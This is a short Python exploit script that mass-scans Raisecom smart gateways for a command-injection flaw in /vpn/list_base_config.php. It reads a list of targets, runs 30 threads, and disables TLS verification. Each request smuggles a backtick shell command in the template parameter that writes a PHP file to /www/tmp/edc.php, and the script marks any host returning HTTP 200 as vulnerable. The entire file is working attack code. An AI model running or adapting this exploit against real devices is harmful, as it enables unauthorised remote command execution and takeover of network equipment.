import requests,argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    parse = argparse.ArgumentParser(description="瑞斯康达智能网关config.php命令执行")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                targets.append(target)
            pool.map(check, targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息{e}")
def check(url):
    target = f"{url}/vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Fedc.php%60"
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
    'Connection': 'close',
    'Accept-Encoding':'gzip,deflate'
    }

    response = requests.get(url=target, headers=headers, verify=False, timeout=3)
    try:
        if response.status_code == 200 :
            print(f"[*] {url} 存在漏洞,请查看:{url}/tmp/edc.php")
        else:
            print(f"[!] {url} 没有漏洞")
    except Exception as e:
        print(f"[Error] {url} TimeOut")


if __name__ == '__main__':
    main()
